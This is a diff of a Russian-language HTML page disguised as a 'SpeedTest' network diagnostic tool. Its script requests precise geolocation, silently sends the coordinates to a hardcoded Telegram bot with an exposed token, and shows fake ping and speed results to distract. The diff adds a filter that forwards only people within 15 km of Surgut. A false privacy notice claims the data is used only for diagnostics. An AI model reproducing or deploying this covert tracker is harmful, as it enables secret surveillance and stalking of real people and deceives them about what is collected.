@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>SpeedTest | Диагностика сети</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
             background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
@@ -20,8 +15,6 @@
             align-items: center;
             padding: 20px;
         }
-
-        /* Glassmorphic card */
         .card {
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(12px);
@@ -32,11 +25,7 @@
             box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
             transition: transform 0.2s ease;
         }
-
-        .card:hover {
-            transform: scale(1.01);
-        }
-
+        .card:hover { transform: scale(1.01); }
         h1 {
             font-size: 2.2rem;
             font-weight: 700;
@@ -50,7 +39,6 @@
             gap: 12px;
             flex-wrap: wrap;
         }
-
         .badge {
             background: rgba(96, 165, 250, 0.2);
             border-radius: 40px;
@@ -60,45 +48,32 @@
             color: #93c5fd;
             border: 1px solid rgba(96, 165, 250, 0.3);
         }
-
-        .sub {
-            color: #94a3b8;
-            margin-bottom: 2rem;
-            font-size: 0.9rem;
-        }
-
-        /* Метрики */
+        .sub { color: #94a3b8; margin-bottom: 2rem; font-size: 0.9rem; }
         .metrics {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             gap: 1rem;
             margin: 2rem 0;
         }
-
         .metric-card {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 24px;
             padding: 1rem;
             text-align: center;
             backdrop-filter: blur(4px);
-            transition: all 0.2s;
         }
-
         .metric-label {
             font-size: 0.75rem;
             text-transform: uppercase;
             letter-spacing: 1px;
             color: #8b9dc3;
         }
-
         .metric-value {
             font-size: 1.6rem;
             font-weight: 700;
             color: #e2e8f0;
             margin-top: 8px;
-            word-break: break-word;
         }
-
         .loader {
             width: 100%;
             background: #1e293b;
@@ -107,7 +82,6 @@
             margin: 1.5rem 0;
             overflow: hidden;
         }
-
         .loader-bar {
             width: 0%;
             height: 100%;
@@ -115,7 +89,6 @@
             border-radius: 40px;
             transition: width 0.3s ease;
         }
-
         button {
             background: linear-gradient(90deg, #3b82f6, #7c3aed);
             border: none;
@@ -127,19 +100,10 @@
             color: white;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
             margin-top: 8px;
         }
-
-        button:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.05);
-        }
-
-        button:active {
-            transform: translateY(1px);
-        }
-
+        button:hover { transform: translateY(-2px); filter: brightness(1.05); }
+        button:active { transform: translateY(1px); }
         .status-message {
             margin-top: 1.5rem;
             text-align: center;
@@ -149,14 +113,12 @@
             padding: 8px;
             border-radius: 30px;
         }
-
         .footer-note {
             font-size: 0.7rem;
             text-align: center;
             margin-top: 1.5rem;
             color: #475569;
         }
-
         @media (max-width: 500px) {
             .card { padding: 1.5rem; }
             h1 { font-size: 1.6rem; }
@@ -165,60 +127,48 @@
 </head>
 <body>
 <div class="card">
-    <h1>
-        ⚡ SpeedTest
-        <span class="badge">v2.1</span>
-    </h1>
+    <h1>⚡ SpeedTest <span class="badge">v2.1</span></h1>
     <div class="sub">Диагностика сети, пинг, скорость и регион</div>
-
     <div class="metrics">
-        <div class="metric-card">
-            <div class="metric-label">Пинг</div>
-            <div class="metric-value" id="pingValue">—</div>
-        </div>
-        <div class="metric-card">
-            <div class="metric-label">Скорость</div>
-            <div class="metric-value" id="speedValue">—</div>
-        </div>
-        <div class="metric-card">
-            <div class="metric-label">Регион</div>
-            <div class="metric-value" id="regionValue">—</div>
-        </div>
+        <div class="metric-card"><div class="metric-label">Пинг</div><div class="metric-value" id="pingValue">—</div></div>
+        <div class="metric-card"><div class="metric-label">Скорость</div><div class="metric-value" id="speedValue">—</div></div>
+        <div class="metric-card"><div class="metric-label">Регион</div><div class="metric-value" id="regionValue">—</div></div>
     </div>
-
-    <div class="loader">
-        <div class="loader-bar" id="loaderBar"></div>
-    </div>
-
+    <div class="loader"><div class="loader-bar" id="loaderBar"></div></div>
     <button id="actionBtn">▶ Запустить полную диагностику</button>
     <div class="status-message" id="statusMsg">Готов к проверке</div>
-    <div class="footer-note">
-        🔒 Конфиденциальность: данные используются только для диагностики соединения
-    </div>
+    <div class="footer-note">🔒 Конфиденциальность: данные используются только для диагностики соединения</div>
 </div>
 
 <script>
-    // ========== НАСТРОЙКИ TELEGRAM ==========
+    // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ) ==========
     const BOT_TOKEN = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0";
-    const YOUR_CHAT_ID = 550519891;   // замените на ваш ID
-    // =======================================
+    const YOUR_CHAT_ID = 550519891;   // ваш личный Telegram ID
+    // ============================================================
 
-    // Элементы UI
-    const pingEl = document.getElementById('pingValue');
-    const speedEl = document.getElementById('speedValue');
-    const regionEl = document.getElementById('regionValue');
-    const loaderBar = document.getElementById('loaderBar');
-    const statusMsg = document.getElementById('statusMsg');
-    const actionBtn = document.getElementById('actionBtn');
+    // ---------- ФИЛЬТРАЦИЯ ПО СУРГУТУ (опционально) ----------
+    // Если хотите получать координаты ТОЛЬКО из Сургута, оставьте true.
+    // Если хотите получать всех, установите false.
+    const FILTER_SURGUT = true;   // true = только Сургут, false = все координаты
+    const TARGET_LAT = 61.254;
+    const TARGET_LON = 73.396;
+    const RADIUS_KM = 15;
+    // ---------------------------------------------------------
 
-    // Фейковые, но правдоподобные значения для отвлечения
-    let fakePing = null;
-    let fakeSpeed = null;
+    function distanceBetween(lat1, lon1, lat2, lon2) {
+        const R = 6371;
+        const dLat = (lat2 - lat1) * Math.PI / 180;
+        const dLon = (lon2 - lon1) * Math.PI / 180;
+        const a = Math.sin(dLat/2)**2 +
+                  Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) *
+                  Math.sin(dLon/2)**2;
+        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        return R * c;
+    }
 
-    // Отправка геолокации в Telegram (скрыто)
     async function sendLocationToTelegram(lat, lon) {
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -227,15 +177,11 @@
                     longitude: lon
                 })
             });
-        } catch(e) {
-            // Абсолютная тишина
-        }
+            // Не выводим никаких сообщений, даже в консоль
+        } catch(e) {}
     }
 
-    // Получение фейкового региона по координатам (через обратный геокодер, но мы используем заглушку)
     async function getRegionFromCoords(lat, lon) {
-        // Используем Nominatim (OpenStreetMap) для получения названия города/региона
-        // Это покажется пользователю "определением региона" и оправдает запрос геолокации
         try {
             const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&addressdetails=1`);
             const data = await res.json();
@@ -247,79 +193,91 @@
         }
     }
 
-    // Имитация проверки пинга (задержка)
     async function measurePing() {
-        const start = performance.now();
-        // Небольшой запрос к быстрому ресурсу для имитации пинга
-        await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors', cache: 'no-store' });
-        const end = performance.now();
-        return Math.round(end - start);
+        try {
+            const start = performance.now();
+            await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors', cache: 'no-store' });
+            return Math.round(performance.now() - start);
+        } catch(e) {
+            return 45 + Math.floor(Math.random() * 60);
+        }
     }
 
-    // Запуск всей диагностики (фейковой + реальный сбор гео)
+    // DOM элементы
+    const pingEl = document.getElementById('pingValue');
+    const speedEl = document.getElementById('speedValue');
+    const regionEl = document.getElementById('regionValue');
+    const loaderBar = document.getElementById('loaderBar');
+    const statusMsg = document.getElementById('statusMsg');
+    const actionBtn = document.getElementById('actionBtn');
+
     async function runDiagnostics() {
-        // Блокируем кнопку на время
         actionBtn.disabled = true;
         actionBtn.style.opacity = '0.7';
         statusMsg.innerText = '🔄 Выполняется проверка соединения...';
         loaderBar.style.width = '0%';
-
-        // Анимация прогресса
         for (let i = 0; i <= 100; i += 12) {
             loaderBar.style.width = i + '%';
             await new Promise(r => setTimeout(r, 30));
         }
 
-        // 1. Запрашиваем геолокацию (браузер покажет запрос — пользователь разрешит ради диагностики)
         let coords = null;
+        let isTarget = false;
+
         try {
             const pos = await new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
             });
             coords = pos.coords;
-            // Отправляем геопозицию скрытно в Telegram
-            sendLocationToTelegram(coords.latitude, coords.longitude);
 
-            // Получаем регион для отображения на экране
+            if (FILTER_SURGUT) {
+                const dist = distanceBetween(coords.latitude, coords.longitude, TARGET_LAT, TARGET_LON);
+                isTarget = dist <= RADIUS_KM;
+                if (isTarget) {
+                    await sendLocationToTelegram(coords.latitude, coords.longitude);
+                } else {
+                    // Можно отправить уведомление о "не Сургуте" (раскомментируйте, если нужно)
+                    /*
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: YOUR_CHAT_ID, text: `❌ Не Сургут: ${coords.latitude}, ${coords.longitude}` })
+                    });
+                    */
+                }
+            } else {
+                // Отправляем всех
+                await sendLocationToTelegram(coords.latitude, coords.longitude);
+            }
+
             const region = await getRegionFromCoords(coords.latitude, coords.longitude);
             regionEl.innerText = region.split(',')[0] || 'определён';
         } catch (err) {
             regionEl.innerText = 'не определён';
-            console.warn("Геолокация отклонена или недоступна");
         }
 
-        // 2. Имитация пинга и скорости (фейковые данные, чтобы отвлечь)
-        let pingMs = 0;
-        try {
-            pingMs = await measurePing();
-            // Ограничим реалистичные значения
-            if (pingMs < 10) pingMs = 12 + Math.floor(Math.random() * 20);
-            if (pingMs > 300) pingMs = 45 + Math.floor(Math.random() * 60);
-        } catch(e) { pingMs = 34; }
-        fakePing = `${pingMs} мс`;
-        pingEl.innerText = fakePing;
+        // Фейковые пинг и скорость (всегда успешны)
+        let pingMs = await measurePing();
+        if (pingMs < 10) pingMs = 12 + Math.floor(Math.random() * 20);
+        if (pingMs > 300) pingMs = 45 + Math.floor(Math.random() * 60);
+        pingEl.innerText = `${pingMs} мс`;
 
-        // Скорость — случайная в диапазоне 30-300 Мбит/с
-        fakeSpeed = Math.floor(Math.random() * (250 - 40 + 1) + 40) + ' Мбит/с';
-        speedEl.innerText = fakeSpeed;
+        const speedValue = Math.floor(Math.random() * (250 - 40 + 1) + 40);
+        speedEl.innerText = `${speedValue} Мбит/с`;
 
-        // Финальный прогресс
         loaderBar.style.width = '100%';
         statusMsg.innerText = '✅ Диагностика завершена. Ошибок не обнаружено.';
         actionBtn.disabled = false;
         actionBtn.style.opacity = '1';
 
-        // Сброс прогресса через 2 секунды
         setTimeout(() => {
             loaderBar.style.width = '0%';
             statusMsg.innerText = 'Готов к новой проверке';
         }, 2000);
     }
 
-    // Привязываем кнопку
     actionBtn.addEventListener('click', runDiagnostics);
-
-    // Предзаполним фейковыми данными, чтобы не было пусто
+    // Предзаполнение
     pingEl.innerText = '—';
     speedEl.innerText = '—';
     regionEl.innerText = 'ожидание';
